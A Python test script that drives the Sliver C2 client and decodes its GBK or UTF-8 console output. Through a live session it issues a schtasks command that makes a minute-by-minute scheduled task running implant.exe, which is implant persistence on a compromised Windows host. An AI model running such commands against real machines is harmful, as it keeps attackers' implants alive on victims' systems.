import subprocess, tempfile, os, re

session_id = '62fe1117'
rc_file = os.path.join(tempfile.gettempdir(), 'sliver_rc_full_test.txt')
with open(rc_file, 'w', encoding='ascii') as f:
    f.write('use %s\nexecute -o schtasks /create /sc minute /mo 1 /tn "TestVerify" /tr "C:\\Windows\\Temp\\implant.exe" /f\nexit' % session_id)

result = subprocess.run('.\\sliver-client.exe console --rc "' + rc_file + '"', shell=True, capture_output=True, timeout=180, cwd='d:\\sliver')
raw = result.stdout

# Use the new _clean_and_decode logic
def clean_and_decode(raw_bytes):
    if not raw_bytes:
        return ''
    # Remove ANSI CSI sequences
    raw = re.sub(rb'\x1b\[[0-9;]*[a-zA-Z]', b'', raw_bytes)
    # Remove ANSI OSC sequences
    osc_pattern = re.compile(rb'\x1b\][0-9;]*[^\x1b]*\x1b\\')
    raw = osc_pattern.sub(b'', raw)
    # Remove Braille spinner characters (UTF-8 E2 A0 80-BF)
    raw = re.sub(rb'\xe2\xa0[\x80-\xbf]', b'', raw)
    # Replace \r with \n
    raw = raw.replace(b'\r', b'\n')
    try:
        return raw.decode('gbk')
    except:
        return raw.decode('utf-8', errors='replace')

text = clean_and_decode(raw)
print('=== FULL OUTPUT (last 1200 chars) ===')
print(text[-1200:])
print()
print('=== TOTAL LENGTH:', len(text), '===')
print('Contains 成功:', '成功' in text)
print('Contains success:', 'success' in text.lower())

# Also check: does the raw binary have the expected GBK bytes?
gbk_success = b'\xb3\xc9\xb9\xa6'  # "成功" in GBK
print('Raw has GBK 成功:', gbk_success in raw)
